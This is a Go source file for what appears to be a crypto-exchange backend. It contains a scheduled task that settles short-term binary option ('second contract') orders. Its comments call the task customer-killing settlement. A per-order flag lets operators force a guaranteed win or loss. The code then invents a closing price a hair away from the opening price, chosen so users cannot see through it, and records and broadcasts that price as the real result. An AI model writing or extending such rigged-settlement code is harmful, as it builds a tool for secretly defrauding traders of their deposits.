package task

import (
	"GoCEX/internal/dao"
	"GoCEX/internal/model/entity"
	"GoCEX/internal/service/websocket"
	"context"
	"strings"

	"github.com/gogf/gf/v2/database/gdb"
	"github.com/gogf/gf/v2/frame/g"
	"github.com/gogf/gf/v2/os/gtime"
	"github.com/shopspring/decimal"
)

// SettleSecondContract 秒合约/期权杀客结算任务
// SettleSecondContract 秒合约/期权杀客结算任务
func (s *sTask) SettleSecondContract(ctx context.Context) error {
	g.Log().Info(ctx, "[定时任务] 执行: 秒合约/期权杀客结算")

	// 1. 获取分布式锁 (使用 Postgres Advisory Locks替代 Redis，ID 1002)
	val, errLock := g.DB().GetValue(ctx, "SELECT pg_try_advisory_lock(1002)")
	if errLock != nil || !val.Bool() {
		return nil
	}
	defer func() {
		_, _ = g.DB().Exec(ctx, "SELECT pg_advisory_unlock(1002)")
		// 发布结算完成流水供前端展示
		_, _ = g.Redis().Do(ctx, "XADD", "api-redis-stream.names", "*", "settlement", "3")
	}()

	nowTimestamp := gtime.Timestamp()

	// 2. 查出全部待处理订单: `status=0`, `is_handling=0`, 且 `closeTime <= 当前时间`
	var orders []*entity.SecondContractOrder
	err := dao.SecondContractOrder.Ctx(ctx).
		Where("status", 0).
		Where("is_handling", 0).
		WhereLTE("close_time", nowTimestamp).
		Scan(&orders)

	if err != nil {
		g.Log().Error(ctx, "查询待结秒合约单失败:", err)
		return err
	}

	for _, order := range orders {
		func(o *entity.SecondContractOrder) {
			defer func() {
				if r := recover(); r != nil {
					g.Log().Errorf(ctx, "处理秒合约结算异常 id:%d, err:%v", o.Id, r)
				}
			}()

			// 3. 对单笔订单加乐观锁 `is_handling=1`，防止重入
			result, err := dao.SecondContractOrder.Ctx(ctx).
				Where("id", o.Id).
				Where("is_handling", 0).
				Data(g.Map{"is_handling": 1}).
				Update()
			if err != nil {
				return
			}
			affected, _ := result.RowsAffected()
			if affected <= 0 {
				return // 已被处理
			}

			// 获取当前市场价
			redisKey := "CURRENCY_PRICE:" + o.Symbol
			redisV, _ := g.DB().GetValue(ctx, "SELECT config_value FROM sys_config WHERE config_key = ?", redisKey)
			currentlyPriceStr := strings.Trim(redisV.String(), "\"")
			realClosePrice, _ := decimal.NewFromString(currentlyPriceStr)

			openPrice := decimal.NewFromFloat(o.OpenPrice)
			var finalClosePrice decimal.Decimal

			// 5. 干预逻辑: Sign 0正常 1包赢 2包输  BetContent 0涨 1跌
			// 为防止被看穿，这里造假的差价取一个小波动常量 (实际业务可取盘面跳动规律)
			diff := decimal.NewFromFloat(0.001) // 假定的微距

			if o.Sign == 1 { // 包赢
				if o.BetContent == "0" { // 买涨
					finalClosePrice = openPrice.Add(diff)
				} else { // 买跌
					finalClosePrice = openPrice.Sub(diff)
				}
			} else if o.Sign == 2 { // 包输
				if o.BetContent == "0" { // 买涨
					finalClosePrice = openPrice.Sub(diff)
				} else { // 买跌
					finalClosePrice = openPrice.Add(diff)
				}
			} else { // 正常发挥
				finalClosePrice = realClosePrice
			}

			if finalClosePrice.IsZero() { // 兜底如果获取价格失败导致为0
				finalClosePrice = openPrice
			}

			// 判断盈亏 (0: 涨， 1: 跌)
			var isWin bool
			var isTie bool
			if o.BetContent == "0" {
				isWin = finalClosePrice.GreaterThan(openPrice)
				isTie = finalClosePrice.Equal(openPrice)
			} else {
				isWin = finalClosePrice.LessThan(openPrice)
				isTie = finalClosePrice.Equal(openPrice)
			}

			// 计算派发奖金
			var rewardAmount decimal.Decimal
			var openResult string

			betAmountDec := decimal.NewFromFloat(o.BetAmount)
			rateDec := decimal.NewFromFloat(o.Rate)

			if isWin {
				openResult = "WIN"
				// 盈利 = 本金 + 盈利部分
				rewardAmount = betAmountDec.Add(betAmountDec.Mul(rateDec))
			} else if isTie {
				openResult = "TIE" // 平局退本金
				rewardAmount = betAmountDec
			} else {
				openResult = "LOSE"
				rewardAmount = decimal.Zero
			}

			// 开启事务写账本与改状态
			err = dao.SecondContractOrder.Transaction(ctx, func(ctx context.Context, tx gdb.TX) error {
				// 获取下注底单币种 (例如 USDT)
				baseSymbol := o.BaseSymbol
				if baseSymbol == "" {
					baseSymbol = "USDT" // 兜底
				}

				if rewardAmount.GreaterThan(decimal.Zero) {
					// 赢钱派彩 (解冻直接从 Occupied 里扣走本金不需要，因为开仓时我们做的是FreezeAmount, 即 Amout 不变，Occupied 增加。
					// 但由于秒合约经常直接扣除了本金减到0，请与 FreezeAmount 的具体逻辑对齐。
					// 假定前面下单时是彻底扣除了 Amount (即减少 Amout 和 Available) 的，所以派彩时直接加钱。
					var userAsset entity.AppAsset
					errAsset := dao.AppAsset.Ctx(ctx).
						Where("user_id", o.UserId).
						Where("type", 1). // 现货/通用钱包
						Where("symbol", baseSymbol).
						LockUpdate().Scan(&userAsset)
					if errAsset == nil && userAsset.Id > 0 {
						newAmout := decimal.NewFromFloat(userAsset.Amout).Add(rewardAmount)
						newAvail := decimal.NewFromFloat(userAsset.AvailableAmount).Add(rewardAmount)

						_, _ = dao.AppAsset.Ctx(ctx).Where("id", userAsset.Id).Update(g.Map{
							"amout":            newAmout.InexactFloat64(),
							"available_amount": newAvail.InexactFloat64(),
							"update_time":      gtime.Now(),
						})

						// 记录流水
						_, _ = dao.AppWalletRecord.Ctx(ctx).Insert(entity.AppWalletRecord{
							UserId:       int64(o.UserId),
							Amount:       rewardAmount.InexactFloat64(),
							Type:         41, // 暂定 41 表示秒合约奖金与本金返还
							SerialId:     o.OrderNo,
							Symbol:       baseSymbol,
							Remark:       "期权分账/" + openResult,
							BeforeAmount: userAsset.Amout,
							AfterAmount:  newAmout.InexactFloat64(),
							CreateTime:   gtime.Now(),
						})
					}
				}

				// 更新订单
				_, errTx := dao.SecondContractOrder.Ctx(ctx).Where("id", o.Id).Update(g.Map{
					"status":        1, // 已开奖
					"close_price":   finalClosePrice.InexactFloat64(),
					"reward_amount": rewardAmount.InexactFloat64(),
					"open_result":   openResult,
					"update_time":   gtime.Now(),
				})
				return errTx
			})

			if err != nil {
				g.Log().Errorf(ctx, "秒合约订单 %s 结算库事务失败: %v", o.OrderNo, err)
			} else {
				g.Log().Infof(ctx, "✅ 结算完成: 订单 %s, 结果 %s", o.OrderNo, openResult)
				// 结算成功后，立刻通过 PostgreSQL PubSub 推送开奖结果给对应用户的 WebSocket 客户端
				websocket.PublishCoinOver(ctx, o.UserId, o.OrderNo, rewardAmount.InexactFloat64(), string(openResult))
			}
		}(order)
	}

	return nil
}
